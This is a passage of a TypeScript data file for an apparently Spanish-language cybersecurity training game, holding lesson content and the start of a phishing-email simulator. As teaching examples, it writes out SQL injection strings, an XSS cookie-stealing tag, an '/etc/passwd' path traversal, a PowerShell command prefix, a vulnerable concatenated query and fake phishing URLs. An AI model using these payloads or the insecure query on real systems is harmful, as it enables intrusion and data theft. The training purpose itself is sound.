          'Los atacantes no adivinan contraseñas manualmente; utilizan clústeres de tarjetas gráficas (GPUs) que prueban más de 100,000 millones de combinaciones por segundo usando diccionarios con reglas de sustitución comunes (a->@, o->0, e->3).',
        trapExample:
          '"P@ssw0rd!2026" -> Tiene patrones predecibles de diccionario (< 20 bits de entropía efectiva, se rompe al instante).',
        safeExample:
          '"Caballo#89RelojPlátano" -> Frase de paso (Passphrase) larga de palabras no relacionadas (> 75 bits de entropía, siglos de resistencia).',
        suriTip:
          'Combina bloques de palabras aleatorias (Passphrases) y símbolos en la bóveda para superar el umbral del Robot Cracker.',
      },
    ],
  },
  {
    id: 'permission-swipe-1',
    unitId: 'unit_02',
    order: 2,
    title: 'El Portero de Permisos Móviles',
    subtitle: 'Principio de mínimo privilegio en apps (3 misiones)',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'security',
    lanePosition: 'center',
    expReward: 30,
    estimatedMinutes: 6,
    gameTypeLabel: 'Auditor de Permisos',
    theorySlides: [
      {
        id: 'u2_l2_s1',
        badge: 'Seguridad Móvil',
        title: 'Principio de Mínimo Privilegio (PoLP) en Smartphones',
        icon: 'phonelink_lock',
        standardRef: 'OWASP Mobile Top 10',
        content:
          'Muchos troyanos bancarios llegan a tiendas oficiales disfrazados de aplicaciones inofensivas (linternas, calculadoras, lectores QR). Su trampa consiste en pedir permisos de Micrófono, Contactos o Lectura de SMS al abrirse por primera vez.',
        trapExample:
          'Una app "Calculadora Pro" o "Linterna LED" que solicita permiso para leer tus mensajes SMS y grabar audio.',
        safeExample:
          'Otorgar únicamente permisos estrictamente coherentes con la tarea principal (ej. Galería para un editor de fotos).',
        suriTip:
          'Pregúntate siempre: ¿esta app realmente necesita este sensor para funcionar? Si no, ¡deniega el acceso!',
      },
    ],
  },
  {
    id: 'chest_02',
    unitId: 'unit_02',
    order: 3,
    title: 'Cofre Criptográfico',
    subtitle: 'Bono de Identidad Segura (+75 Bits)',
    type: 'reward_chest',
    status: 'locked',
    stars: 0,
    icon: 'inventory_2',
    lanePosition: 'right',
    expReward: 0,
    estimatedMinutes: 1,
    isClaimed: false,
    bitsReward: 75,
  },
  {
    id: 'firewall-arcade-1',
    unitId: 'unit_02',
    order: 4,
    title: 'Bastión Cortafuegos: Puertos y Paquetes',
    subtitle: 'Videojuego arcade de defensa en 3 carriles en vivo',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'shield',
    lanePosition: 'center',
    expReward: 40,
    estimatedMinutes: 7,
    gameTypeLabel: '🎮 Videojuego Arcade 2D',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u2_l3_s1',
        badge: 'Seguridad Perimetral',
        title: 'Cómo decide un Firewall qué paquetes entran y cuáles se destruyen',
        icon: 'router',
        standardRef: 'ISO/IEC 27001 A.8.20',
        content:
          'Un Firewall inspecciona cada paquete de red que llega a la empresa revisando el Puerto de Destino y la Carga Útil (Payload). Si dejas pasar un paquete malicioso sufrirá una brecha; si bloqueas tráfico legítimo detendrás la operación del negocio.',
        trapExample:
          'Paquetes maliciosos: Inyección SQL ("\' OR 1=1 --"), Fuerza Bruta SSH (:22), Telnet sin cifrar (:23) o troyanos .exe -> ¡Bloquear con Pulso EMP!',
        safeExample:
          'Paquetes legítimos: Peticiones web cifradas HTTPS (:443 con TLS 1.3) y resolución DNS verificada (:53) -> ¡Permitir paso!',
        suriTip:
          'Usa las teclas [A/D] o toca el carril para mover a Suri, [W] para PERMITIR tráfico seguro y [Espacio] para DESTRUIR amenazas.',
      },
    ],
  },
  {
    id: 'firewall-arcade-2',
    unitId: 'unit_02',
    order: 5,
    title: 'Jefe: Tormenta DDoS y WAF Zero Trust',
    subtitle: 'Oleada de alta velocidad contra inyecciones y Botnets',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'local_fire_department',
    lanePosition: 'left',
    expReward: 50,
    estimatedMinutes: 7,
    gameTypeLabel: '🎮 Jefe Arcade Firewall',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u2_l4_s1',
        badge: 'WAF & Mitigación DDoS',
        title: 'Ataques de Capa de Aplicación (XSS, Path Traversal y Botnets)',
        icon: 'security_update_warning',
        standardRef: 'OWASP WAF Rules',
        content:
          'En un ataque avanzado, los ciberdelincuentes camuflan scripts maliciosos (<script>stealCookie()</script>), intentos de robo de archivos del servidor (../../etc/passwd) e inundaciones DDoS mezclados con clientes reales que intentan comprar.',
        trapExample:
          'Payloads con "<script>", "../../etc/passwd", "SYN_FLOOD_BOTNET" o "cmd.exe /c powershell".',
        safeExample:
          'Transacciones API REST con token JWT válido por puerto :443 y consultas de catálogo HTTPS.',
        suriTip:
          '¡Mantén tu combo alto en el videojuego! Lee el payload en consola antes de que el paquete cruce el perímetro.',
      },
    ],
  },
];

export const UNIT_3_NODES: LearningNode[] = [
  {
    id: 'network-maze-1',
    unitId: 'unit_03',
    order: 1,
    title: 'Laberinto Wi-Fi: Túnel VPN vs Sniffers',
    subtitle: 'Mueve a Suri en el mapa 2D, activa la VPN y esquiva Evil Twins',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'vpn_lock',
    lanePosition: 'left',
    expReward: 40,
    estimatedMinutes: 7,
    gameTypeLabel: '🎮 Videojuego Laberinto 2D',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u3_l1_s1',
        badge: 'Seguridad en Redes Inalámbricas',
        title: 'El Peligro del Wi-Fi Público: Sniffers y Routers "Evil Twin"',
        icon: 'wifi_tethering_error',
        standardRef: 'IEEE 802.11 / VPN IPSec',
        content:
          'Cuando trabajas desde un aeropuerto, hotel o cafetería, los atacantes despliegan dos trampas: 1) "Sniffers" que escuchan los datos que viajan sin cifrar por el aire, y 2) Puntos de acceso "Evil Twin" (Wi-Fi Gratis clonado) que secuestran toda tu conexión.',
        trapExample:
          'Cruzar por una red con Sniffers sin encender la VPN o conectarse a una antena "Evil Twin" falsa.',
        safeExample:
          'Activar primero el Escudo VPN (que cifra tus paquetes con AES-256) antes de atravesar zonas monitoreadas por Sniffers.',
        suriTip:
          'En el laberinto 2D: usa WASD o el D-Pad para recoger primero el Escudo VPN 🛡️, luego los paquetes 📦 y llega al Servidor 🖥️.',
      },
    ],
  },
  {
    id: 'network-maze-2',
    unitId: 'unit_03',
    order: 2,
    title: 'Operación Zero Trust: VPN + Llave MFA',
    subtitle: 'Infiltración táctica avanzada con doble validación',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'key',
    lanePosition: 'center',
    expReward: 45,
    estimatedMinutes: 8,
    gameTypeLabel: '🎮 Laberinto Táctico Nivel 2',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u3_l2_s1',
        badge: 'Zero Trust Network Access',
        title: 'Nunca Confíes, Siempre Verifica: Cifrado + Token MFA',
        icon: 'verified_user',
        standardRef: 'NIST SP 800-207 (Zero Trust)',
        content:
          'En una arquitectura Zero Trust moderna, estar conectado a la red o tener VPN no basta para entrar al servidor financiero: el servidor exige además presentar una Llave Criptográfica MFA (FIDO2 / Autenticador) antes de abrir sus compuertas.',
        trapExample:
          'Intentar acceder al servidor central sin haber recolectado tanto el túnel VPN como la llave MFA.',
        safeExample:
          'Planificar la ruta en la cuadrícula para activar la VPN, recoger la llave MFA, recolectar los 3 archivos críticos y entrar al servidor.',
        suriTip:
          'Recuerda: los puntos Wi-Fi "Evil Twin" (antenas rojas) dañan tu escudo incluso con VPN; ¡rodéalos siempre!',
      },
    ],
  },
  {
    id: 'chest_03',
    unitId: 'unit_03',
    order: 3,
    title: 'Cofre del Túnel Cifrado',
    subtitle: 'Bono de Red Segura (+100 Bits)',
    type: 'reward_chest',
    status: 'locked',
    stars: 0,
    icon: 'inventory_2',
    lanePosition: 'right',
    expReward: 0,
    estimatedMinutes: 1,
    isClaimed: false,
    bitsReward: 100,
  },
  {
    id: 'url-inspector-2',
    unitId: 'unit_03',
    order: 4,
    title: 'Portales Cautivos y Ataques en Red',
    subtitle: 'Auditoría de enlaces de red y triaje Wi-Fi corporativo',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'public',
    lanePosition: 'center',
    expReward: 35,
    estimatedMinutes: 6,
    gameTypeLabel: 'Auditoría de Red & Triaje',
    theorySlides: [
      {
        id: 'u3_l3_s1',
        badge: 'Portales Cautivos Falsos',
        title: 'Cuando el Wi-Fi del Hotel te pide la clave de tu correo corporativo',
        icon: 'travel_explore',
        standardRef: 'CAPPORT RFC 8952',
        content:
          'Los atacantes configuran portales de bienvenida Wi-Fi que imitan la pantalla de inicio de sesión de Microsoft 365 o Google Workspace. Un portal Wi-Fi legítimo jamás requiere la contraseña de tu correo de trabajo.',
        trapExample:
          'http://portal-wifi-aeropuerto.login-office365.xyz/conectar (sin cifrado HTTP y dominio falso .xyz).',
        safeExample:
          'Compartir datos móviles (Hotspot personal 4G/5G) cuando necesites realizar operaciones sensibles fuera de la oficina.',
        suriTip:
          'Identifica los segmentos inseguros y clasifica las situaciones de conexión remota.',
      },
    ],
  },
];

export const UNIT_4_NODES: LearningNode[] = [
  {
    id: 'incident-soc-1',
    unitId: 'unit_04',
    order: 1,
    title: 'Alerta Roja SOC: Contención de Ransomware',
    subtitle: 'Videojuego de consola SOC en vivo: Aísla, Purga y Restaura',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'emergency',
    lanePosition: 'left',
    expReward: 45,
    estimatedMinutes: 8,
    gameTypeLabel: '🎮 Videojuego Consola SOC',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u4_l1_s1',
        badge: 'Respuesta a Incidentes',
        title: 'El Orden de Oro NIST ante un Brote Activo de Ransomware',
        icon: 'crisis_alert',
        standardRef: 'NIST SP 800-61r2',
        content:
          'Cuando un equipo sufre una infección por Ransomware, el malware intenta propagarse por la red local hacia los servidores cada segundo. Si intentas restaurar el backup sin haber aislado la red y eliminado el virus primero, ¡el ransomware cifrará también tu copia restaurada!',
        trapExample:
          'Intentar restaurar el Backup o limpiar el equipo mientras sigue conectado a la VLAN corporativa.',
        safeExample:
          'Secuencia estricta en nodos infectados: 1° Aislar VLAN 🔌 -> 2° Purgar con EDR 🛡️ -> 3° Restaurar Backup 3-2-1 💾 (y Revocar IAM 🔑 en sesiones robadas).',
        suriTip:
          'En la consola SOC selecciona cada nodo en alerta y aplica los botones tácticos en el orden exacto antes de que el cifrado llegue al 100%.',
      },
    ],
  },
  {
    id: 'chat-deepfake-1',
    unitId: 'unit_04',
    order: 2,
    title: 'IA Generativa: Deepfakes de Voz y Clonación',
    subtitle: 'Defensa ante suplantación biométrica y sintética con IA',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'record_voice_over',
    lanePosition: 'center',
    expReward: 35,
    estimatedMinutes: 6,
    gameTypeLabel: 'Simulador Anti-Deepfake',
    theorySlides: [
      {
        id: 'u4_l2_s1',
        badge: 'Ciberseguridad vs IA Maliciosa',
        title: 'Cómo operan los Deepfakes de Voz en tiempo real contra PYMES',
        icon: 'graphic_eq',
        standardRef: 'ENISA AI Threat Landscape',
        content:
          'Los modelos de síntesis de voz por IA pueden clonar el tono, acento y respiración del gerente general tomando unos pocos segundos de un video institucional en redes sociales. Luego envían notas de voz por WhatsApp ordenando pagos urgentes a cuentas nuevas.',
        trapExample:
          'Confiar ciegamente en una nota de voz de WhatsApp porque "suena exactamente igual a la voz de la Directora".',
        safeExample:
          'Exigir la "Palabra Clave de Seguridad" acordada internamente o realizar una videollamada/llamada al número corporativo registrado.',
        suriTip:
          'En la era de la IA, la voz en un mensaje de audio NO equivale a identidad verificada.',
      },
    ],
  },
  {
    id: 'incident-soc-2',
    unitId: 'unit_04',
    order: 3,
    title: 'Jefe Final: Defensa Total de la Madriguera',
    subtitle: 'Ataque simultáneo multi-nodo de Ransomware + Secuestro IAM',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'military_tech',
    lanePosition: 'right',
    expReward: 60,
    estimatedMinutes: 9,
    gameTypeLabel: '🎮 Jefe Final Consola SOC',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u4_l3_s1',
        badge: 'Operación Centinela Maestro',
        title: 'Mitigación de Ataque Coordinado Multi-Vector (APT)',
        icon: 'shield_moon',
        standardRef: 'ISO/IEC 27035',
        content:
          'En el desafío final del curso, un grupo atacante lanza un ataque combinado contra la PYME: dos estaciones de trabajo han sido infectadas con Ransomware activo y simultáneamente dos cuentas administrativas sufren robo de sesión IAM.',
        trapExample:
          'Dejar nodos infectados sin aislar mientras el medidor de cifrado avanza rápidamente.',
        safeExample:
          'Priorizar: 1° Aislar primero TODOS los nodos infectados para frenar la velocidad de propagación, 2° Revocar las sesiones IAM y 3° Purgar + Restaurar Backup 3-2-1.',
        suriTip:
          '¡Consejo de Jefe! Si aísla primero los dos nodos infectados, la velocidad del reloj de cifrado bajará drásticamente.',
      },
    ],
  },
  {
    id: 'chest_04',
    unitId: 'unit_04',
    order: 4,
    title: 'Cofre Maestro Centinela',
    subtitle: 'Recompensa Suprema (+150 Bits)',
    type: 'reward_chest',
    status: 'locked',
    stars: 0,
    icon: 'workspace_premium',
    lanePosition: 'center',
    expReward: 0,
    estimatedMinutes: 1,
    isClaimed: false,
    bitsReward: 150,
  },
];

const UNIT_5_NODES: LearningNode[] = [
  {
    id: 'code-patcher-1',
    unitId: 'unit_05',
    order: 1,
    title: 'Videojuego: Escudo DevSecOps (Inyección SQL y XSS)',
    subtitle: 'Intercepta exploits web e inyecta parches seguros en el código en vivo',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'terminal',
    lanePosition: 'left',
    expReward: 40,
    estimatedMinutes: 7,
    gameTypeLabel: '🎮 Videojuego DevSecOps Live',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u5_l1_s1',
        badge: 'OWASP Top 10 · A03 Injection',
        title: 'Por qué las Consultas Concatenadas permiten robar toda una Base de Datos',
        icon: 'database',
        standardRef: 'OWASP ASVS 4.0',
        content:
          'Cuando un programador escribe: "SELECT * FROM users WHERE user = \'" + input + "\'", un atacante puede enviar "admin\' OR \'1\'=\'1\' --". El motor SQL interpreta el texto del usuario como un comando lógico siempre verdadero y entrega acceso administrativo total.',
        trapExample:
          'db.query(`SELECT * FROM usuarios WHERE email = \'${req.body.email}\'`)',
        safeExample:
          'db.execute("SELECT * FROM usuarios WHERE email = ?", [req.body.email]) // Prepared Statement parametrizado',
        suriTip:
          'En el videojuego Escudo DevSecOps, selecciona siempre el parche con Consultas Parametrizadas (?) o Sanitización DOM antes de que el exploit llegue al 100%.',
      },
    ],
  },
  {
    id: 'owasp-url-5',
    unitId: 'unit_05',
    order: 2,
    title: 'Auditoría de APIs: IDOR y Parámetros Maliciosos',
    subtitle: 'Detecta manipulación de endpoints y robo de sesiones por URL',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'api',
    lanePosition: 'center',
    expReward: 35,
    estimatedMinutes: 6,
    gameTypeLabel: 'Inspector de Endpoints + Radar',
    theorySlides: [
      {
        id: 'u5_l2_s1',
        badge: 'OWASP Top 10 · A01 Broken Access Control',
        title: 'Vulnerabilidad IDOR (Referencia Directa Insegura a Objetos)',
        icon: 'lock_person',
        standardRef: 'OWASP API Security Top 10',
        content:
          'Muchos portales de facturación generan enlaces como "/api/descargar-factura?id=501". Si el servidor no verifica que la factura 501 pertenezca al usuario que tiene la sesión iniciada, un atacante puede cambiar el número a 502, 503... y descargar todas las facturas de la empresa.',
        trapExample:
          'Confiar en que nadie adivinará el número de factura en la URL sin validar el token JWT del propietario.',
        safeExample:
          'Validar en el servidor: if (factura.clienteId !== sesionUsuario.id) return res.status(403).',
        suriTip:
          'Nunca pases tokens de sesión ni contraseñas en la barra de direcciones (GET query params); usa cabeceras Authorization.',
      },
    ],
  },
  {
    id: 'code-patcher-2',
    unitId: 'unit_05',
    order: 3,
    title: 'Jefe DevSecOps: Blindaje Total del Portal PYME',
    subtitle: 'Defiende la pasarela de pagos ante una ofensiva multi-exploit OWASP',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'code_blocks',
    lanePosition: 'right',
    expReward: 55,
    estimatedMinutes: 8,
    gameTypeLabel: '🎮 Videojuego Jefe DevSecOps',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u5_l3_s1',
        badge: 'Defensa en Profundidad Web',
        title: 'Blindaje de Pasarelas de Pago: SQLi, XSS, IDOR y Command Injection',
        icon: 'security_update_good',
        standardRef: 'PCI-DSS v4.0 · OWASP',
        content:
          'En esta operación de jefe defenderás el backend de comercio electrónico frente a 4 oleadas consecutivas de exploits avanzados: Inyección SQL booleana, XSS robador de cookies, escalada IDOR y ejecución remota de comandos (RCE).',
        trapExample:
          'Usar filtros superficiales como ".replace(\'script\', \'\')" que un atacante evade fácilmente.',
        safeExample:
          'Aplicar parametrización estricta, validación de propietario RBAC y listas blancas sin invocar shells del sistema.',
        suriTip:
          'Lee con atención la línea roja resaltada en la terminal antes de inyectar cada Hotfix.',
      },
    ],
  },
  {
    id: 'chest_05',
    unitId: 'unit_05',
    order: 4,
    title: 'Cofre Arquitecto DevSecOps',
    subtitle: 'Recompensa de Código Seguro (+120 Bits)',
    type: 'reward_chest',
    status: 'locked',
    stars: 0,
    icon: 'inventory_2',
    lanePosition: 'center',
    expReward: 0,
    estimatedMinutes: 1,
    isClaimed: false,
    bitsReward: 120,
  },
];

const UNIT_6_NODES: LearningNode[] = [
  {
    id: 'forensic-hunt-1',
    unitId: 'unit_06',
    order: 1,
    title: 'Videojuego: Laboratorio CSI Cyber (Caza en RAM)',
    subtitle: 'Escanea procesos activos, detecta troyanos camuflados y corta sockets C2',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'biotech',
    lanePosition: 'left',
    expReward: 45,
    estimatedMinutes: 8,
    gameTypeLabel: '🎮 Videojuego CSI Threat Hunter',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u6_l1_s1',
        badge: 'MITRE ATT&CK T1036 · Masquerading',
        title: 'Cómo Cazar Troyanos Ocultos en la Memoria Volátil (RAM)',
        icon: 'memory',
        standardRef: 'ISO/IEC 27037 Forense',
        content:
          'Los atacantes disfrazan sus procesos maliciosos usando nombres casi idénticos a los de Windows, como "svch0st.exe" (con un cero) o "RuntimeBr0ker.exe". Para descubrirlos en el Laboratorio CSI Cyber debes revisar dos indicadores infalibles: carecen de Firma Digital Oficial y mantienen conexiones activas hacia IPs externas en puertos sospechosos (como 4444).',
        trapExample:
          'Terminar procesos legítimos firmados por Microsoft (como lsass.exe o svchost.exe) provocando pantallazo azul.',
        safeExample:
          'Identificar procesos sin firma o con certificado falso que exfiltran datos a IPs remotas C2 y ejecutar KILL PID.',
        suriTip:
          'En la Fase 1 elimina los procesos troyanos en RAM; en la Fase 2 dictamina la causa raíz para cerrar el caso forense.',
      },
    ],
  },
  {
    id: 'forensic-hunt-2',
    unitId: 'unit_06',
    order: 2,
    title: 'Videojuego: Caza de Infostealers y Cryptominers',
    subtitle: 'Neutraliza robo silencioso de credenciales y minería oculta en servidores',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'troubleshoot',
    lanePosition: 'center',
    expReward: 50,
    estimatedMinutes: 8,
    gameTypeLabel: '🎮 Videojuego CSI Avanzado',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u6_l2_s1',
        badge: 'Threat Hunting Corporativo',
        title: 'Infostealers de Navegador y Persistencia en Servidor',
        icon: 'policy',
        standardRef: 'NIST SP 800-86',
        content:
          'Un Infostealer (como RedLine o Lumma) se ejecuta en segundo plano para leer las bases de datos SQLite del navegador donde se guardan contraseñas y cookies de sesión, enviándolas por HTTPS o Telegram a un servidor C2.',
        trapExample:
          'Guardar contraseñas bancarias y administrativas sin cifrado maestro en el navegador de un equipo compartido.',
        safeExample:
          'Detectar el binario no firmado que accede al almacén de credenciales, cortar su socket C2 y rotar todas las llaves.',
        suriTip:
          'Fíjate en la alerta de comportamiento de cada PID: te revelará si el proceso está leyendo cookies o minando criptomonedas.',
      },
    ],
  },
  {
    id: 'forensic-boss-6',
    unitId: 'unit_06',
    order: 3,
    title: 'Graduación Centinela Supremo: Operación Escudo Total',
    subtitle: 'Misión final combinada: Forense CSI + Parcheo DevSecOps + Contención SOC',
    type: 'lesson',
    status: 'locked',
    stars: 0,
    icon: 'workspace_premium',
    lanePosition: 'right',
    expReward: 75,
    estimatedMinutes: 10,
    gameTypeLabel: '🎮 Gran Final Multi-Videojuego',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u6_l3_s1',
        badge: 'Certificación Centinela Supremo',
        title: 'Defensa Cibernética Integral: Del Código a la Memoria RAM',
        icon: 'verified_user',
        standardRef: 'NIST CSF 2.0 Completo',
        content:
          'Has llegado al examen práctico final de SuriLearn. Un grupo APT ha lanzado una operación en dos fases: primero intentan inyectar un exploit SQLi/RCE en el portal web y luego despliegan un implante en memoria RAM para exfiltrar datos.',
        trapExample:
          'Limpiar el malware de la memoria RAM pero dejar abierta la vulnerabilidad web por la que entraron.',
        safeExample:
          '1° Cazar y terminar los procesos C2 en el Laboratorio CSI Cyber y 2° Parchear la vulnerabilidad en el motor DevSecOps.',
        suriTip:
          '¡Supera las 2 etapas de videojuego de esta misión final para graduarte como Centinela Supremo de la Madriguera!',
      },
    ],
  },
  {
    id: 'chest_06',
    unitId: 'unit_06',
    order: 4,
    title: 'Cofre Leyenda Cibernética',
    subtitle: 'Trofeo Final de Graduación (+200 Bits)',
    type: 'reward_chest',
    status: 'locked',
    stars: 0,
    icon: 'military_tech',
    lanePosition: 'center',
    expReward: 0,
    estimatedMinutes: 1,
    isClaimed: false,
    bitsReward: 200,
  },
];

const UNIT_7_NODES: LearningNode[] = [
  {
    id: 'arcade-hangman-1',
    unitId: 'unit_07',
    order: 1,
    title: 'Arcade: Ahorcado Centinela',
    subtitle: 'Descifra términos críticos antes de perder tu escudo',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'spellcheck',
    lanePosition: 'left',
    expReward: 30,
    estimatedMinutes: 4,
    gameTypeLabel: '🕹️ Ahorcado Clásico',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u7_l1_s1',
        badge: 'Zona Arcade · Vocabulario',
        title: 'Ahorcado Centinela: Decodifica Amenazas Clave',
        icon: 'spellcheck',
        standardRef: 'Glosario NIST',
        content:
          'Lee la pista táctica de Suri y selecciona letras con el teclado o en pantalla para descubrir cada concepto de ciberseguridad antes de agotar 6 intentos.',
        trapExample:
          'Adivinar letras al azar sin leer primero la pista ni las vocales frecuentes.',
        safeExample:
          'Usar la pista de categoría, probar vocales clave y cuidar los 6 escudos.',
        suriTip:
          'Si te atascas en una palabra larga, tienes 1 pista gratuita por ronda para revelar una letra.',
      },
    ],
  },
  {
    id: 'arcade-snake-1',
    unitId: 'unit_07',
    order: 2,
    title: 'Arcade: Culebrita Firewall',
    subtitle: 'Recoge paquetes seguros y esquiva trampas de malware',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'sports_esports',
    lanePosition: 'center',
    expReward: 35,
    estimatedMinutes: 4,
    gameTypeLabel: '🐍 Culebrita Clásica',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u7_l2_s1',
        badge: 'Zona Arcade · Reflejos de Red',
        title: 'Culebrita Firewall: Recoge Defensa y Esquiva Malware',
        icon: 'route',
        standardRef: 'Defensa Perimetral',
        content:
          'Guía a Suri por la cuadrícula 12x12 con las flechas del teclado, WASD o el D-Pad táctil. Captura 6 paquetes verdes seguros (HTTPS, MFA, VPN, PATCH) y evita chocar con los bordes o las trampas rojas de malware.',
        trapExample:
          'Girar bruscamente contra el borde o cruzar una casilla roja con calavera ☠.',
        safeExample:
          'Planificar giros con una casilla de margen; tienes 3 escudos por partida.',
        suriTip:
          'En móvil o desktop puedes pausar en cualquier momento si necesitas retomar el control.',
      },
    ],
  },
  {
    id: 'arcade-memory-1',
    unitId: 'unit_07',
    order: 3,
    title: 'Arcade: Memorama Centinela',
    subtitle: 'Empareja cada ataque con su contramedida exacta',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'grid_view',
    lanePosition: 'right',
    expReward: 35,
    estimatedMinutes: 4,
    gameTypeLabel: '🃏 Memorama Clásico',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u7_l3_s1',
        badge: 'Zona Arcade · Memoria Táctica',
        title: 'Memorama Amenaza ↔ Defensa',
        icon: 'grid_view',
        standardRef: 'Controles OWASP & NIST',
        content:
          'Voltea dos tarjetas por turno y asocia cada amenaza (roja) con la defensa correcta (teal) antes de consumir tus 16 movimientos.',
        trapExample:
          'Voltear cartas sin recordar qué amenaza viste en el turno anterior.',
        safeExample:
          'Memorizar posiciones clave para encadenar combos rápidos de emparejamiento.',
        suriTip:
          'Cada pareja encontrada muestra un resumen de por qué esa defensa neutraliza ese ataque.',
      },
    ],
  },
  {
    id: 'arcade-whack-1',
    unitId: 'unit_07',
    order: 4,
    title: 'Arcade: Atrapa al Hacker',
    subtitle: 'Golpea intrusos en los puertos sin bloquear servicios reales',
    type: 'lesson',
    status: 'active',
    stars: 0,
    icon: 'bolt',
    lanePosition: 'center',
    expReward: 40,
    estimatedMinutes: 3,
    gameTypeLabel: '⚡ Atrapa al Hacker',
    isVideoGame: true,
    theorySlides: [
      {
        id: 'u7_l4_s1',
        badge: 'Zona Arcade · Triaje en Puertos',
        title: 'Atrapa al Hacker (Whack-a-Hacker)',
        icon: 'bolt',
        standardRef: 'SOC L1 Triage',
        content:
          'Vigila los 9 puertos de red. Toca rápido las amenazas rojas (troyanos, fuerza bruta, bots) para bloquear 8 ataques en 35 segundos, pero NO toques los servicios verdes legítimos.',
        trapExample:
          'Hacer clic sin mirar y bloquear un Backup TLS o DNS corporativo válido.',
        safeExample:
          'Reaccionar rápido solo ante alertas rojas para mantener tus 3 escudos.',
        suriTip:
          '¡Concéntrate en el color y el ícono antes de golpear cada puerto!',
      },
    ],
  },
  {
    id: 'chest_07',
    unitId: 'unit_07',
    order: 5,
    title: 'Cofre Maestro Arcade',
    subtitle: 'Recompensa de la Zona Arcade (+250 Bits)',
    type: 'reward_chest',
    status: 'locked',
    stars: 0,
    icon: 'inventory_2',
    lanePosition: 'center',
    expReward: 0,
    estimatedMinutes: 1,
    isClaimed: false,
    bitsReward: 250,
  },
];

export const ALL_BASE_NODES: LearningNode[] = [
  ...UNIT_1_NODES,
  ...UNIT_2_NODES,
  ...UNIT_3_NODES,
  ...UNIT_4_NODES,
  ...UNIT_5_NODES,
  ...UNIT_6_NODES,
  ...UNIT_7_NODES,
];

// Keep MODULE_1_BASE_NODES export for backward compatibility
export const MODULE_1_BASE_NODES = UNIT_1_NODES;

// ==========================================
// 3. EXERCISE DEFINITIONS FOR ALL 4 COURSES
// ==========================================

export const LESSON_EXERCISES_MAP: Record<string, Exercise[]> = {
  // ---------------------------------------------------------------------------
  // CURSO 1: ANATOMÍA DEL PHISHING E INGENIERÍA SOCIAL
  // ---------------------------------------------------------------------------
  'inbox-scanner-1': [
    {
      id: 'ex_inbox_01',
      type: 'inbox_simulator',
      title: 'Misión 1/2: Suplantación de Nómina',
      instruction: 'Inspecciona la cabecera técnica y decide si este correo es legítimo o Phishing:',
      suriPrompt: 'Despliega la cabecera técnica y revisa si el remitente FROM y los registros SPF/DKIM coinciden.',
      suriPoseInitial: 'idea',
      header: {
        visualSender: 'Recursos Humanos - Nómina Oficial',
        actualSender: 'soporte@banc0-alert.xyz',
        isSenderSpoofed: true,
        spfStatus: 'fail',
        dkimStatus: 'fail',
        receivedTime: '10:42 AM',
      },
      subject: '⚠️ URGENTE: Inconsistencia en abono salarial de este mes',
      isUrgentFlag: true,
      bodyText:
        'Estimado colaborador, detectamos un error en su cuenta de nómina para el abono salarial de este mes. Su pago ha sido temporalmente retenido. Para liberarlo, verifique sus datos bancarios antes del mediodía.',
      actionButtonText: '[Verificar mis datos bancarios aquí]',
      link: {
        displayedText: 'http://phish-site.banc0-alert.xyz/login',
        actualDestinationUrl: 'http://phish-site.banc0-alert.xyz/login',
        isSuspicious: true,
        inspectWarning: 'Dominio engañoso banc0-alert.xyz con HTTP no seguro',
      },
      footnoteWarning: 'Límite perentorio: menos de 2 horas',
      correctVerdict: 'phish',
      clues: [
        'Remitente banc0 con cero en lugar de letra o',
        'Fallo total en autenticación SPF y DKIM',
        'Sentido de urgencia artificial con amenaza de retención de nómina',
      ],
      feedback: {
        empathy: 'Es muy común alarmarse cuando mencionan problemas con tu salario o nómina.',
        technicalIndicator:
          'El remitente real es soporte@banc0-alert.xyz y los protocolos de seguridad SPF/DKIM fallaron rotundamente.',
        preventiveTip:
          'Las empresas nunca solicitan datos bancarios de nómina a través de enlaces con urgencia. Consulta por canal interno oficial con RRHH.',
      },
    },
    {
      id: 'ex_inbox_02',
      type: 'inbox_simulator',
      title: 'Misión 2/2: Comunicado Interno Autenticado',
      instruction: 'Analiza este comunicado del Comité de Seguridad y verifica su autenticidad técnica:',
      suriPrompt: 'Un buen centinela no bloquea todo por miedo: verifica si SPF, DKIM y el dominio son legítimos.',
      suriPoseInitial: 'shield',
      header: {
        visualSender: 'Seguridad TI - Intranet Corporativa',
        actualSender: 'seguridad-ti@intranet-empresa.com',
        isSenderSpoofed: false,
        spfStatus: 'pass',
        dkimStatus: 'pass',
        receivedTime: '11:15 AM',
      },
      subject: 'Boletín Mensual: Simulacro programado de actualización de políticas',
      isUrgentFlag: false,
      bodyText:
        'Hola equipo, les recordamos que este viernes a las 3:00 PM realizaremos la charla trimestral de buenas prácticas. No es necesario ingresar contraseñas ni descargar archivos; el enlace al salón interno está en la intranet.',
      actionButtonText: '[Ver agenda en Intranet Corporativa]',
      link: {
        displayedText: 'https://intranet-empresa.com/eventos/agenda-q4',
